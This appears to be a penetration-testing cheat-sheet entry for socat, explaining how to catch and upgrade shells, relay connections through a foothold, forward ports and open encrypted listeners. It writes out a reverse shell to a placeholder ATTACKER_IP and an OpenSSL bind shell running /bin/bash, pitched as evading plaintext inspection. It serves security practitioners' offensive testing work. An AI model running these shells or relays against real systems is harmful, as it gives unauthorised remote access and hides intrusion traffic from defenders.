---
tool: socat
slug: socat
stages: [misc]
targets: [windows, linux]
category: Relays, port forwards and better shells
platforms: [linux, windows]
services: []
ports: []
tags: [shells, redirect, port forward, relay, pivoting, file transfer, tty]
attack: [T1090, T1572, T1571]
summary: A multi-tool for moving bytes between two endpoints — sockets, files, ttys, pipes. On an engagement it catches and upgrades shells to a fully interactive TTY, relays a connection through a foothold, forwards a port, and moves files. When netcat runs out of options, socat usually has one.
references:
  - socat man page | https://linux.die.net/man/1/socat
  - socat on GitHub | https://github.com/craSH/socat
---

## When to reach for it

You need something richer than netcat: a shell that supports job control and tab-completion, a relay so an internal host can reach your listener via a foothold, or a quick port forward. socat joins two addresses and shunts data both ways, which covers all of those.

## Key flags

- `TCP-LISTEN:PORT,reuseaddr,fork`: listen, allow reuse, handle many clients.
- `TCP:HOST:PORT`: connect out to a host and port.
- `FILE:` / `EXEC:`: wire an endpoint to a file, tty or command.
- `file:$(tty),raw,echo=0`: your terminal as a raw endpoint (for a full TTY).
- `pty,stderr`: give the remote shell a real pseudo-terminal.

## Commands

Fully interactive TTY shell — listener on your box, payload on the target:

```bash
# on your machine
socat file:$(tty),raw,echo=0 TCP-LISTEN:PORT

# on the target
socat TCP:ATTACKER_IP:PORT EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

Relay: forward a foothold's local listener out to you (reach an internal service):

```bash
socat TCP-LISTEN:8080,reuseaddr,fork TCP:10.10.20.25:80
```

Encrypted listener (blends in, defeats plaintext inspection):

```bash
socat OPENSSL-LISTEN:PORT,cert=server.pem,verify=0,fork EXEC:/bin/bash
```

## Workflow

1. For a stable shell, run the `file:$(tty)` listener, then connect back with the `pty` payload.
2. For a relay, run socat on the foothold to forward its reachable internal port to a port you can hit.
3. For a port forward, listen on one port and connect to the destination host:port.
4. Use the OPENSSL endpoints when you want the channel encrypted and less obvious.

## Notes

The `file:$(tty),raw,echo=0` + `pty` pattern gives a far better shell than `nc` — arrow keys, Ctrl-C and `su`/`ssh` prompts all work, so it is worth carrying a static socat binary to the target. For deeper pivoting into a whole subnet, a dedicated tunneller (Chisel, ligolo-ng) beats a chain of socat relays, but socat is unbeatable for a quick one-off redirect. See the shell-upgrade note for the netcat-only equivalents.
